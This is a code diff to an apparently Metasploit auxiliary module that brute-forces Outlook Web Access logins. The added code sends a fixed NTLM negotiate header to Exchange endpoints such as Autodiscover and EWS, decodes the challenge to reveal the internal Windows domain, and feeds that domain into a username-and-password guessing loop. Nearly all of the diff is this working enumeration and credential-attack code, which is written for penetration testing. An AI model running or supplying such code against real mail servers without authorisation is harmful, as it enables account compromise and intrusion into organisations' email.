@@ -6,6 +6,7 @@
 ##
 
 require 'msf/core'
+require 'rex/proto/ntlm/message'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -25,7 +26,8 @@ class Metasploit3 < Msf::Auxiliary
 					'Vitor Moreira',
 					'Spencer McIntyre',
 					'SecureState R&D Team',
-					'sinn3r'
+					'sinn3r',
+					'Brandon Knight'
 				],
 			'License'        => MSF_LICENSE,
 			'Actions'        =>
@@ -82,6 +84,39 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def run
+		urls = ["aspnet_client",
+			"Autodiscover",
+			"ecp",
+			"EWS",
+			"Microsoft-Server-ActiveSync",
+			"OAB",
+			"PowerShell",
+			"Rpc"]
+
+		domain = nil
+
+		begin
+			urls.each { |url|
+				res = send_request_cgi({
+					'encode'   => true,
+					'uri'      => "/#{url}",
+					'method'   => 'GET',
+					'headers'  =>  {"Authorization" => "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="}
+				}, 25)
+
+				if res.code == 401 and res['WWW-Authenticate'].match(/^NTLM/i)
+					hash = res['WWW-Authenticate'].split('NTLM ')[1]
+					domain = Rex::Proto::NTLM::Message.parse(Rex::Text.decode_base64(hash))[:target_name].value().gsub(/\0/,'')
+					print_good("Found target domain: " + domain)
+					break
+				end
+			}
+
+		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
+			print_error("#{msg} HTTP Connection Failed, Aborting")
+			return :abort
+		end
+
 		# Store the original setting
 		@blank_passwords_setting = datastore['BLANK_PASSWORDS']
 
@@ -116,14 +151,22 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			each_user_pass do |user, pass|
 				vprint_status("#{msg} Trying #{user} : #{pass}")
-				try_user_pass(user, pass, auth_path, inbox_path, login_check, vhost)
+				try_user_pass({"user" => user, "pass"=>pass, "domain" => domain, "auth_path"=>auth_path, "inbox_path"=>inbox_path, "login_check"=>login_check, "vhost"=>vhost})
 			end
 		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED
 			print_error("#{msg} HTTP Connection Error, Aborting")
 		end
 	end
 
-	def try_user_pass(user, pass, auth_path, inbox_path, login_check, vhost)
+	def try_user_pass(opts)
+		domain = opts["domain"]
+		user = opts["user"]
+		pass = opts["pass"]
+		auth_path = opts["auth_path"]
+		inbox_path = opts["inbox_path"]
+		login_check = opts["login_check"]
+		vhost = opts["vhost"]
+		user = domain + '\\' + user if domain
 		user = datastore['AD_DOMAIN'] + '\\' + user if datastore['AD_DOMAIN'] != ''
 		headers = {
 			'Cookie' => 'PBack=0'
@@ -211,3 +254,4 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 end
+
